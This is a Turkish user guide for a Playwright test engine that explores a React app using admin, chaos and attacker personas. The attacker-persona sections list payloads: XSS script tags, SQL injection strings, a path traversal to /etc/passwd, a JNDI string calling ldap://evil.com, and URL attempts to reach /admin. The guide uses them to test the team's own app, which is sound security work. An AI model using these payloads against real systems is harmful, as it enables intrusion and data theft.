# 🤖 Project Sentinel - Kullanım Kılavuzu

## 🎯 Genel Bakış

**Project Sentinel**, React uygulamanızı bir insan gibi gezen, butonları keşfeden, formları rastgele dolduran ve sistemin kırılma noktalarını kendi kendine bulan **otonom bir test motorudur**.

Geleneksel test yaklaşımlarından farklı olarak, Sentinel **sabit senaryolar kullanmaz**. Bunun yerine, yapay zeka benzeri davranışlarla uygulamayı dinamik olarak keşfeder.

---

## 📦 Kurulum

### 1. Bağımlılıkları Yükle
```bash
npm install --save-dev @playwright/test @faker-js/faker
```

### 2. Dosyayı Oluştur
Test dosyası zaten oluşturuldu: `./tests/sentinel-engine.spec.ts`

### 3. Playwright Browser'ları Kur (İlk kez)
```bash
npx playwright install
```

---

## 🚀 Hızlı Başlangıç

### Tüm Testleri Çalıştır (Headed Mode)
```bash
npx playwright test tests/sentinel-engine.spec.ts --headed
```

### Sadece Bir Persona'yı Test Et

**Strict Admin (Kontrollü Keşif):**
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Strict Admin" --headed
```

**Chaos Monkey (Stres Testi):**
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Chaos Monkey" --headed
```

**Spy Member (Güvenlik Testi):**
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Spy Member" --headed
```

**Random Mode (Tam Otonom):**
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Random Mode" --headed
```

---

## 🎭 Persona Modları

### 👮‍♂️ 1. Strict Admin
**Karakter:** Disiplinli, kuralcı yönetici

**Davranışlar:**
- Admin (ID: 1) olarak giriş yapar
- Formları eksiksiz ve doğru doldurur
- Hata mesajı görünce testi durdurur
- Kontrollü, tek tıklama yapar
- Gerçekçi veriler kullanır (faker.js)

**Kullanım Amacı:** 
- Normal kullanıcı deneyimini simüle eder
- Temel happy path senaryolarını test eder
- Regression testing için ideal

**Örnek Çıktı:**
```
🎭 Persona Selected: STRICT_ADMIN
   👮‍♂️ Logging in as ADMIN (ID: 1)
   📍 Step 1/100
   Health: HEALTHY (Score: 100/100)
   Found: 12 interactive elements, 2 forms
   📝 Filling form...
   🖱️ Clicking: "Maç Oluştur"
   ✅ Navigation detected!
```

---

### 😈 2. Chaos Monkey
**Karakter:** Kaotik, agresif test kullanıcısı

**Davranışlar:**
- Rastgele bir kullanıcı olarak giriş yapar
- Formlara kaotik veriler girer:
  - Emoji: 😈💀🔥
  - XSS: `<script>alert("XSS")</script>`
  - SQL Injection: `' OR '1'='1`
  - 10,000 karakterlik metin
  - Negatif sayılar: `-1`
  - Boşluk ve newline'lar
- Butonlara 1 saniyede 3-10 kere hızlıca tıklar
- Sayfa stabilizasyonunu beklemez

**Kullanım Amacı:**
- Stress testing (yük testi)
- Input validation (girdi doğrulama) testi
- Edge case'leri bulma
- XSS/SQLi zafiyetlerini tespit etme
- UI kırılma noktalarını keşfetme

**Örnek Çıktı:**
```
🎭 Persona Selected: CHAOS_MONKEY
   😈 Logging in as RANDOM USER (ID: 7)
   😈 CHAOS MODE: Rapid clicking!
   📝 Filling form...
      [name input] = "<script>alert('XSS')</script>"
      [age input] = "-999999"
      [notes textarea] = "AAAAAAA..." (10000 chars)
   🚨 CRITICAL ISSUE DETECTED!
      - Found "undefined" in rendered content
```

---

### 🕵️ 3. Spy Member
**Karakter:** Kötü niyetli kullanıcı, hacker

**Davranışlar:**
- Member (ID: 2) olarak giriş yapar
- URL manipülasyonu ile admin panele sızmaya çalışır:
  - `/admin`
  - `/#admin`
  - `/?screen=admin`
- Formlara malicious payload'lar girer:
  - SQL Injection: `admin' OR '1'='1' --`
  - Path Traversal: `../../etc/passwd`
  - JNDI Injection: `${jndi:ldap://evil.com/a}`
- RBAC (Role-Based Access Control) kurallarını test eder

**Kullanım Amacı:**
- Security testing (güvenlik testi)
- Authorization bypass denemesi
- Privilege escalation testi
- RBAC doğrulaması

**Örnek Çıktı:**
```
🎭 Persona Selected: SPY_MEMBER
   🕵️ Logging in as MEMBER (ID: 2) - Will attempt privilege escalation
   🕵️ SPY MODE: Attempting to access /admin
   Health: ERROR (Score: 45/100)
      - Found 2 error elements (.error)
   [SECURITY] Unauthorized access attempt blocked ✅
```

---

## 📊 Çıktı Raporu Açıklaması

Test tamamlandığında şu rapor ekrana yazdırılır:

```
╔═══════════════════════════════════════════════════════════════════════╗
║                    PROJECT SENTINEL - FINAL REPORT                    ║
╚═══════════════════════════════════════════════════════════════════════╝

📊 EXPLORATION STATS:
   • Toplam Keşfedilen Ekran: 15
   • Ziyaret Edilen URL: 8
   • Toplam İnteraksiyon: 47
   • Gezinti Derinliği: 52

🔍 DISCOVERIES:
   1. Dashboard (12 element, 0 form)
   2. Maç Oluştur (8 element, 1 form)
   3. Kadro Yönetimi (15 element, 0 form)
   ...

❌ ERRORS FOUND:
   • Toplam Hata: 3
   • Kritik Hatalar: 1
   
   [CRITICAL] VISUAL: Found "undefined" in rendered content
   [MEDIUM] CONSOLE: TypeError: Cannot read property 'id' of undefined

🗺️ NAVIGATION MAP:
   Login → Dashboard → MatchCreate → MatchDetails → Error → Dashboard → ...

🎯 COVERAGE SCORE:
   • Element Coverage: 94.0%
   • Screen Coverage: 50.0%
   • Overall Health: ⚠️ GOOD

═══════════════════════════════════════════════════════════════════════
```

### Metrik Açıklamaları:

| Metrik | Açıklama |
|--------|----------|
| **Keşfedilen Ekran** | Sentinel'in ziyaret ettiği benzersiz ekran sayısı |
| **Ziyaret Edilen URL** | Farklı URL'lerin sayısı |
| **Toplam İnteraksiyon** | Tıklama, form doldurma gibi toplam aksiyon |
| **Gezinti Derinliği** | Toplam adım sayısı (navigation + action) |
| **Element Coverage** | Etkileşime girilen element oranı (%) |
| **Screen Coverage** | Keşfedilen ekran / Toplam ekran oranı (%) |
| **Overall Health** | ✅ EXCELLENT (0 hata) / ⚠️ GOOD (1-4 hata) / ❌ POOR (5+ hata) |

---

## 🛠 Konfigürasyon

`SENTINEL_CONFIG` objesini düzenleyerek motor davranışını özelleştirebilirsiniz:

```typescript
const SENTINEL_CONFIG = {
  MAX_STEPS: 100,              // Maksimum keşif adımı (default: 100)
  MAX_RETRIES: 3,              // Crash sonrası yeniden deneme (default: 3)
  ACTION_TIMEOUT: 5000,        // Her aksiyon için timeout (ms)
  NAVIGATION_TIMEOUT: 10000,   // Navigasyon timeout (ms)
  STABILITY_WAIT: 1000,        // Sayfa stabilizasyonu (ms)
  CHAOS_INTENSITY: 0.7,        // Chaos Monkey yoğunluğu (0-1)
  DEEP_SCAN_ENABLED: true,     // Derin DOM tarama
  SCREENSHOT_ON_ERROR: true,   // Hata anında screenshot
  VERBOSE_LOGGING: true        // Detaylı loglama
};
```

### Örnek: Marathon Mode (200 adım)
```typescript
SENTINEL_CONFIG.MAX_STEPS = 200;
```

### Örnek: Hızlı Test (50 adım)
```typescript
SENTINEL_CONFIG.MAX_STEPS = 50;
SENTINEL_CONFIG.STABILITY_WAIT = 500; // Daha hızlı
```

### Örnek: Daha Agresif Chaos Monkey
```typescript
SENTINEL_CONFIG.CHAOS_INTENSITY = 1.0; // Her zaman kaotik
```

---

## 🧪 Test Modları

### 1. Strict Admin (Kontrollu)
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Strict Admin"
```
**Süre:** ~3-5 dakika
**Amaç:** Normal kullanıcı akışını test et

---

### 2. Chaos Monkey (Agresif)
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Chaos Monkey"
```
**Süre:** ~4-6 dakika
**Amaç:** Sistemi zorla, edge case'leri bul

---

### 3. Spy Member (Güvenlik)
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Spy Member"
```
**Süre:** ~3-5 dakika
**Amaç:** Authorization bypass, RBAC test et

---

### 4. Random Mode (Tam Otonom)
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Random Mode"
```
**Süre:** ~3-5 dakika
**Amaç:** Her çalıştırmada farklı persona ile keşfet

---

### 5. Marathon Mode (200 adım)
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Marathon"
```
**Süre:** ~10-15 dakika
**Amaç:** Uzun süreli stress test, memory leak tespiti

---

### 6. Parallel Multi-Persona
```bash
npx playwright test tests/sentinel-engine.spec.ts -g "Parallel"
```
**Süre:** ~5-8 dakika (paralel)
**Amaç:** Tüm personaları aynı anda çalıştır, karşılaştırmalı analiz

---

## 🔍 4 Ana Modül Detayları

### MODÜL 1: Akıllı Keşif Motoru (Explorer Engine)
**Görevler:**
- Tıklanabilir elementleri tarar (`button`, `a`, `[onclick]`)
- Ziyaret edilmemiş elementlere öncelik verir
- DOM snapshot diff ile ekran değişikliğini algılar
- Formları bulur ve kaydeder
- Navigation map'i oluşturur

**Örnek:**
```typescript
const elements = await explorer.discoverInteractiveElements(page);
// => [{ element, signature, text, selector }, ...]

const navChanged = await explorer.detectNavigationChange(page);
// => true/false
```

---

### MODÜL 2: Dinamik Persona (Shapeshifter)
**Görevler:**
- Persona seçer (Admin/Chaos/Spy)
- Persona'ya göre giriş yapar
- Persona'ya göre interaksiyon stratejisi belirler
- Persona'ya göre form doldurur

**Örnek:**
```typescript
const persona = new PersonaSimulator('CHAOS_MONKEY');
await persona.login(page);
await persona.fillForm(page, inputs);
// => Kaotik veriler doldurulur
```

---

### MODÜL 3: Bilişsel Görme (Cognitive Vision)
**Görevler:**
- Error class'ları tarar (`.error`, `.alert-danger`)
- Rendered text'te `undefined`, `null`, `NaN` arar
- White Screen of Death (WSOD) tespit eder
- Broken image kontrolü
- Health score hesaplar (0-100)

**Örnek:**
```typescript
const health = await vision.analyzeScreenHealth(page);
// => { status: 'HEALTHY', issues: [], score: 100 }
```

---

### MODÜL 4: Self-Healing Engine
**Görevler:**
- Crash tespit eder
- Sayfa reload ile kurtarma dener
- Re-login yapar
- En fazla 3 kez deneme (MAX_RETRIES)
- Son sağlıklı URL'i hatırlar

**Örnek:**
```typescript
const recovered = await healer.attemptRecovery(page, persona);
// => true/false
```

---

## 🐛 Hata Yakalama

Sentinel şu hata tiplerini yakalar:

| Hata Tipi | Severity | Açıklama |
|-----------|----------|----------|
| `CONSOLE` | MEDIUM | Browser console'da JavaScript hatası |
| `VISUAL` | LOW-CRITICAL | Error class, undefined text, WSOD |
| `NETWORK` | MEDIUM | 404, 500 gibi HTTP hataları |
| `CRASH` | CRITICAL | Browser page crash |
| `SECURITY` | HIGH | Unauthorized access attempt |

---

## 📸 Screenshot Alma

Kritik hatalarda otomatik screenshot alınır:

```typescript
SENTINEL_CONFIG.SCREENSHOT_ON_ERROR = true; // Enable (default)
```

**Konum:** `test-results/sentinel-critical-{step}-{timestamp}.png`

---

## 🎯 Kullanım Senaryoları

### Senaryo 1: CI/CD Pipeline (Regression Testing)
```bash
# Headless mode
npx playwright test tests/sentinel-engine.spec.ts -g "Strict Admin"

# Exit code 0 = Başarılı, 1 = Hata bulundu
echo $?
```

### Senaryo 2: Nightly Build (Full Coverage)
```bash
# Marathon mode + Parallel
npx playwright test tests/sentinel-engine.spec.ts -g "Marathon|Parallel"
```

### Senaryo 3: Security Audit (Penetration Testing)
```bash
# Spy Member + Chaos Monkey
npx playwright test tests/sentinel-engine.spec.ts -g "Spy|Chaos"
```

### Senaryo 4: Development (Quick Check)
```bash
# Random mode, 50 adım
# (sentinel-engine.spec.ts içinde MAX_STEPS = 50 yap)
npx playwright test tests/sentinel-engine.spec.ts -g "Random" --headed
```

---

## 🚨 Sorun Giderme

### "page.goto: Navigation failed"
**Sebep:** Dev server çalışmıyor
**Çözüm:**
```bash
npm run dev
# Başka terminal'de:
npx playwright test tests/sentinel-engine.spec.ts
```

---

### "Timeout exceeded"
**Sebep:** Sayfa yavaş yükleniyor veya sonsuz döngü
**Çözüm:**
```typescript
SENTINEL_CONFIG.NAVIGATION_TIMEOUT = 20000; // Artır
SENTINEL_CONFIG.ACTION_TIMEOUT = 10000;
```

---

### "Too many crashes"
**Sebep:** Chaos Monkey çok agresif
**Çözüm:**
```typescript
SENTINEL_CONFIG.CHAOS_INTENSITY = 0.3; // Azalt (0.7 -> 0.3)
```

---

### "No elements found"
**Sebep:** Selector'lar değişmiş veya login başarısız
**Çözüm:**
- Console log'lara bak
- `--headed` ile çalıştır ve gözlemle
- Login akışını kontrol et

---

## 📈 İstatistiksel Analiz

Raporlarda şu metrikleri analiz edin:

### Başarılı Test:
```
✅ Element Coverage: 90%+
✅ Screen Coverage: 50%+
✅ Overall Health: EXCELLENT
✅ Critical Errors: 0
```

### Başarısız Test:
```
❌ Element Coverage: <50%
❌ Screen Coverage: <20%
❌ Overall Health: POOR
❌ Critical Errors: 5+
```

### İyileştirme Gerekli:
```
⚠️ Element Coverage: 60-80%
⚠️ Screen Coverage: 30-45%
⚠️ Overall Health: GOOD
⚠️ Critical Errors: 1-4
```

---

## 🔗 Kaynak Kodlar

- **Main File:** `tests/sentinel-engine.spec.ts`
- **Modules:**
  - `ExplorerEngine` (Satır 65)
  - `PersonaSimulator` (Satır 225)
  - `CognitiveVision` (Satır 485)
  - `SelfHealingEngine` (Satır 585)
  - `SentinelEngine` (Satır 655)

---

## 🎓 İleri Düzey Kullanım

### Custom Persona Oluşturma
```typescript
// tests/sentinel-engine.spec.ts içinde yeni persona ekle
type PersonaType = 'STRICT_ADMIN' | 'CHAOS_MONKEY' | 'SPY_MEMBER' | 'CUSTOM_TESTER';

// PersonaSimulator.selectRandomPersona() güncelle
// PersonaSimulator.login() ve interact() metodlarını güncelle
```

### ML Model Entegrasyonu (Gelecek)
```typescript
// Cognitive Vision'a AI ekle
async predictNextAction(page: Page): Promise<string> {
  // TensorFlow.js model yükle
  // Ekran görüntüsünü analiz et
  // En iyi aksiyon öner
}
```

---

## 📞 Destek

Sorularınız için:
- **GitHub Issues:** (Proje repository)
- **Email:** sentinel-support@example.com
- **Docs:** Bu dosya

---

**Hazırlayan:** Sahada Dev Team
**Versiyon:** 1.0.0
**Tarih:** 2026-02-14
**Status:** ✅ Production Ready
